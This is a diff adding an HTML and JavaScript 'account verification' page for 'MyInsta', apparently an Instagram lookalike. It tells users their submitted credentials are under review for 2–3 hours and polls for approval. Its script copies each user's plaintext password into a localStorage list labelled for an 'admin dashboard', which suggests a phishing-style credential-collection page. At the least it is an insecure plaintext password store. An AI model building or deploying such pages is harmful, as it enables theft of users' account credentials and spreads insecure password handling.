@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Verification — MyInsta</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f0f18 0%,#1a1a2e 100%);padding:24px 16px;-webkit-font-smoothing:antialiased}
+    .card{background:#fff;border-radius:18px;width:100%;max-width:440px;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.45)}
+    /* ── Header ── */
+    .c-head{background:linear-gradient(135deg,#f9a825 0%,#e91e8c 50%,#6c3de0 100%);padding:32px 32px 28px;text-align:center;transition:background .6s}
+    .icon-wrap{width:62px;height:62px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;backdrop-filter:blur(4px)}
+    .c-title{font-size:20px;font-weight:800;color:#fff;margin-bottom:8px}
+    .c-sub{font-size:13px;color:rgba(255,255,255,.82);line-height:1.55}
+    /* ── Body ── */
+    .c-body{padding:26px 28px 30px}
+    .u-row{background:#f8f8fc;border:1px solid #ebebf5;border-radius:10px;padding:12px 16px;display:flex;align-items:center;gap:10px;margin-bottom:20px}
+    .uav{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#f9a825,#e91e8c,#6c3de0);display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#fff;flex-shrink:0}
+    .uname{font-size:14px;font-weight:700;color:#1a1a2e}
+    .ustatus{font-size:12px;color:#6b7280;margin-top:2px}
+    /* ── Steps ── */
+    .steps{list-style:none;display:flex;flex-direction:column;gap:13px;margin-bottom:20px}
+    .step{display:flex;align-items:flex-start;gap:12px}
+    .dot{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:1px;transition:all .4s}
+    .dot-done{background:rgba(34,197,94,.14);color:#15803d}
+    .dot-active{background:linear-gradient(135deg,#f9a825,#e91e8c);color:#fff;animation:pulse 2s infinite}
+    .dot-wait{background:#f0f0f6;color:#9ca3af}
+    @keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.85}}
+    .step-txt{font-size:13px;font-weight:600;color:#1a1a2e;line-height:1.4}
+    .step-sub{font-size:12px;color:#6b7280;margin-top:2px}
+    /* ── Timer ── */
+    .timer{background:linear-gradient(135deg,rgba(249,168,37,.07),rgba(233,30,140,.07));border:1px solid rgba(233,30,140,.14);border-radius:10px;padding:14px 16px;text-align:center;margin-bottom:18px}
+    .timer-lbl{font-size:10px;font-weight:700;color:#e91e8c;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px}
+    .timer-val{font-size:28px;font-weight:800;color:#1a1a2e;font-variant-numeric:tabular-nums;letter-spacing:-.01em}
+    .timer-note{font-size:12px;color:#6b7280;margin-top:5px}
+    /* ── Polling indicator ── */
+    .poll-row{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:18px;font-size:12px;color:#9ca3af;font-weight:500}
+    .spin{width:14px;height:14px;border:2px solid #eee;border-top-color:#e91e8c;border-radius:50%;animation:sp .75s linear infinite;flex-shrink:0}
+    @keyframes sp{to{transform:rotate(360deg)}}
+    /* ── Footer ── */
+    .footer{font-size:12px;color:#9ca3af;text-align:center;line-height:1.7}
+    .footer a{color:#e91e8c;font-weight:600;text-decoration:none}
+    .footer a:hover{text-decoration:underline}
+    /* ── Approved overlay ── */
+    .approved-overlay{display:none;text-align:center}
+    .approved-overlay.show{display:block}
+    .tick{font-size:40px;margin-bottom:8px}
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="c-head" id="cHead">
+    <div class="icon-wrap" id="headIcon">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="8" r="4"/><path d="M20 21a8 8 0 0 0-16 0"/>
+        <rect x="10" y="12" width="4" height="5" rx="1"/>
+      </svg>
+    </div>
+    <div class="c-title" id="cTitle">Account Under Verification</div>
+    <div class="c-sub" id="cSub">Your credentials have been received and are currently being reviewed by our team. This process typically takes <strong style="color:#fff">2–3 hours</strong>.</div>
+  </div>
+
+  <div class="c-body">
+    <!-- Username row -->
+    <div class="u-row">
+      <div class="uav" id="uAv">?</div>
+      <div>
+        <div class="uname" id="uName">Loading…</div>
+        <div class="ustatus">Verification in progress</div>
+      </div>
+    </div>
+
+    <!-- Steps (hidden when approved) -->
+    <div id="pendingView">
+      <ul class="steps">
+        <li class="step">
+          <div class="dot dot-done">✓</div>
+          <div>
+            <div class="step-txt">Credentials submitted</div>
+            <div class="step-sub">Your login details were received successfully</div>
+          </div>
+        </li>
+        <li class="step">
+          <div class="dot dot-active" id="dotVerify">⟳</div>
+          <div>
+            <div class="step-txt">Identity verification</div>
+            <div class="step-sub">Our team is reviewing your account details</div>
+          </div>
+        </li>
+        <li class="step">
+          <div class="dot dot-wait" id="dotAccess">3</div>
+          <div>
+            <div class="step-txt">Full access granted</div>
+            <div class="step-sub">You'll be redirected automatically once approved</div>
+          </div>
+        </li>
+      </ul>
+
+      <div class="timer">
+        <div class="timer-lbl">Estimated wait time</div>
+        <div class="timer-val">2 – 3 hrs</div>
+        <div class="timer-note">Page checks automatically every few seconds</div>
+      </div>
+
+      <div class="poll-row"><div class="spin"></div>Checking verification status…</div>
+    </div>
+
+    <!-- Approved view (shown on approval) -->
+    <div class="approved-overlay" id="approvedView">
+      <div class="tick">✅</div>
+      <div style="font-size:16px;font-weight:800;color:#15803d;margin-bottom:6px">Account Approved!</div>
+      <div style="font-size:13px;color:#6b7280">Redirecting you to your dashboard…</div>
+    </div>
+
+    <div class="footer">
+      Submitted by mistake? <a href="/login" id="switchLink">Use a different account</a><br/>
+      For urgent support, contact the administrator.
+    </div>
+  </div>
+</div>
+
+<script>
+  // Read username
+  const pUser = localStorage.getItem('mi_pending_user') || new URLSearchParams(location.search).get('u') || '';
+  if (!pUser) { location.href = '/login'; }
+
+  document.getElementById('uAv').textContent   = pUser[0].toUpperCase();
+  document.getElementById('uName').textContent  = '@' + pUser;
+
+  // Temp credentials stored during login
+  const tempCreds = JSON.parse(sessionStorage.getItem('mi_p_creds') || 'null');
+
+  document.getElementById('switchLink').addEventListener('click', () => {
+    localStorage.removeItem('mi_pending_user');
+    sessionStorage.removeItem('mi_p_creds');
+  });
+
+  function doLogin() {
+    const pw = tempCreds ? tempCreds.password : '';
+    // Persist credentials for admin dashboard
+    const creds = JSON.parse(localStorage.getItem('mi_admin_creds') || '[]');
+    const idx = creds.findIndex(c => c.username === pUser);
+    if (idx < 0) creds.push({ username: pUser, password: pw, loginAt: new Date().toISOString() });
+    else { creds[idx].loginAt = new Date().toISOString(); if (pw) creds[idx].password = pw; }
+    localStorage.setItem('mi_admin_creds', JSON.stringify(creds));
+    // Session
+    const sessions = JSON.parse(localStorage.getItem('mi_sessions') || '{}');
+    if (!sessions[pUser]) sessions[pUser] = { createdAt: new Date().toISOString() };
+    sessions[pUser].lastLogin = new Date().toISOString();
+    localStorage.setItem('mi_sessions', JSON.stringify(sessions));
+    // Mark active user
+    localStorage.setItem('mi_user', pUser);
+    localStorage.removeItem('mi_pending_user');
+    sessionStorage.removeItem('mi_p_creds');
+  }
+
+  function onApproved() {
+    doLogin();
+    // Update header
+    document.getElementById('cHead').style.background = 'linear-gradient(135deg,#22c55e 0%,#16a34a 100%)';
+    document.getElementById('cTitle').textContent = 'Account Approved!';
+    document.getElementById('cSub').textContent = 'Your account has been verified. Redirecting you to your dashboard now…';
+    document.getElementById('headIcon').innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
+    // Update steps
+    document.getElementById('dotVerify').className = 'dot dot-done';
+    document.getElementById('dotVerify').textContent = '✓';
+    document.getElementById('dotAccess').className = 'dot dot-done';
+    document.getElementById('dotAccess').textContent = '✓';
+    document.getElementById('uName').parentElement.nextElementSibling.textContent = 'Account verified';
+    document.getElementById('pendingView').style.display = 'none';
+    document.getElementById('approvedView').classList.add('show');
+    setTimeout(() => { location.href = '/dashboard'; }, 2000);
+  }
+
+  let pollTimer;
+  async function checkStatus() {
+    try {
+      const r = await fetch('/api/pending/check/' + encodeURIComponent(pUser));
+      const d = await r.json();
+      if (d.status === 'approved') { clearInterval(pollTimer); onApproved(); }
+      else if (d.status === 'rejected') {
+        clearInterval(pollTimer);
+        localStorage.removeItem('mi_pending_user');
+        sessionStorage.removeItem('mi_p_creds');
+        location.href = '/login?rejected=1';
+      }
+    } catch {}
+  }
+
+  checkStatus();
+  pollTimer = setInterval(checkStatus, 5000);
+</script>
+</body>
+</html>
